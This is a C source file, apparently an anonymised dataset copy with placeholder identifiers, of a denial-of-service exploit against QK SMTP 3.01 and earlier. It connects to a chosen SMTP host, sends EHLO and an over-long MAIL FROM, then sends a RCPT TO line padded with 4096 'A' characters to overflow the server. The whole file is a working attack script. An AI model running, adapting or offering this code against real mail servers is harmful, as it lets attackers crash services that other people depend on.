
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; int h_addrtype; } ;
typedef int sockin ;
typedef int WSADATA ;


 int VAR_0 ;
 int FUNC_0 (int,int) ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_1 (int) ;
 int FUNC_2 () ;
 scalar_t__ FUNC_3 (int ,int *) ;
 unsigned short FUNC_4 (char*) ;
 int FUNC_5 (int) ;
 int FUNC_6 (int,struct sockaddr*,int) ;
 int FUNC_7 (int) ;
 int FUNC_8 (int ,char*) ;
 struct hostent* FUNC_9 (char*) ;
 int FUNC_10 (unsigned short) ;
 int FUNC_11 (char*,int ,int) ;
 int FUNC_12 (char*,...) ;
 int FUNC_13 (int,char*,int,int ) ;
 int FUNC_14 (int,char*,int ,int ) ;
 int FUNC_15 (int ,int ,int ) ;
 int VAR_3 ;
 int FUNC_16 (char*,char*) ;
 int FUNC_17 (char*) ;
 char* FUNC_18 (char*,char*) ;

int FUNC_19(int VAR_4, char *VAR_5[])
{
static char VAR_6[65000];
static char VAR_7[65000];
WSADATA VAR_8;


struct hostent *VAR_9;
struct sockaddr_in VAR_10;
char VAR_11[300], *VAR_12;
int VAR_13, VAR_14;
int VAR_15;
char *VAR_16;
unsigned short VAR_17;

if (VAR_4 <= 1)
   {
   FUNC_12("QK SMTP <= 3.01 DoS RCPT TO: Overflow\n");
   FUNC_12("By: Greg Linares (glinares.code [at ] gmail [dot] com)\n\n");
      FUNC_12("Usage: %s [hostname] [port]\n", VAR_5[0]);
      FUNC_12("default port is 25 \n");

      FUNC_7(0);
   }


VAR_16 = VAR_5[1];
if (VAR_5[2]) VAR_17 = FUNC_4(VAR_5[2]);
else VAR_17 = FUNC_4("25");

if (FUNC_3(FUNC_0(1, 1), &VAR_8) < 0)
   {
      FUNC_8(VAR_3, "Error setting up with WinSock v1.1\n");
      FUNC_7(-1);
   }


   VAR_9 = FUNC_9(VAR_16);
   if (VAR_9 == ((void*)0))
   {
      FUNC_12("ERROR: Uknown host %s\n", VAR_16);
   FUNC_12("%s",VAR_16);
      FUNC_7(-1);
   }

   VAR_10.sin_family = VAR_9->h_addrtype;
   VAR_10.sin_port = FUNC_10(VAR_17);
   VAR_10.sin_addr = *((struct in_addr *)VAR_9->h_addr);

   if ((VAR_13 = FUNC_15(VAR_0, VAR_2, 0)) == VAR_1)
   {
      FUNC_12("ERROR: Socket Error\n");
      FUNC_7(-1);
   }

   if ((FUNC_6(VAR_13, (struct sockaddr *) &VAR_10,
                sizeof(VAR_10))) == VAR_1)
   {
      FUNC_12("ERROR: Connect Error\n");
      FUNC_5(VAR_13);
      FUNC_2();
      FUNC_7(-1);
   }

   FUNC_12("Connected to [%s] on port [%d], sending overflow....\n",
          VAR_16, VAR_17);


   if ((VAR_14 = FUNC_13(VAR_13, VAR_11, 300, 0)) == VAR_1)
   {
      FUNC_12("ERROR: Recv Error\n");
      FUNC_5(VAR_13);
      FUNC_2();
      FUNC_7(1);
   }


   VAR_11[VAR_14] = '\0';
   VAR_12 = FUNC_18(VAR_11, "2");
   if (VAR_12 == ((void*)0))
   {
      FUNC_12("ERROR: NO  response from SMTP service\n");
      FUNC_5(VAR_13);
      FUNC_2();
      FUNC_7(-1);
   }

   static char VAR_18[65000];
   FUNC_11(VAR_18, 0, 4096);
   char VAR_19[] = "RCPT TO: ";
   char VAR_20[] = "@a.com>\r\n";
   char VAR_21[] = "A";
   FUNC_11(VAR_6, 0, 65000);
   FUNC_11(VAR_7, 0, 100);
   for (VAR_15=0; VAR_15<100; VAR_15++)
 {
    FUNC_16(VAR_7, "A");
 }

   char VAR_22[] = "EHLO \r\n";
   char VAR_23[] = "MAIL FROM: <HI@";
  FUNC_16(VAR_6, VAR_23);
 FUNC_16(VAR_6, VAR_7);
 FUNC_16(VAR_6, VAR_20);



   FUNC_14(VAR_13, VAR_22, FUNC_17(VAR_22), 0);
 FUNC_1(500);
 FUNC_14(VAR_13, VAR_6, FUNC_17(VAR_6),0);
 FUNC_1(1000);
 FUNC_16(VAR_18, VAR_19);
 for (VAR_15=0; VAR_15<4096; VAR_15++){
  FUNC_16(VAR_18, VAR_21);
 }
 FUNC_16(VAR_18, VAR_20);
 FUNC_12("%s", VAR_18);
 FUNC_14(VAR_13, VAR_18, FUNC_17(VAR_18),0);
 FUNC_1(2000);
    FUNC_12("Overflow Packet Sent Successfully...\n");
 FUNC_5(VAR_13);
   FUNC_2();
 }
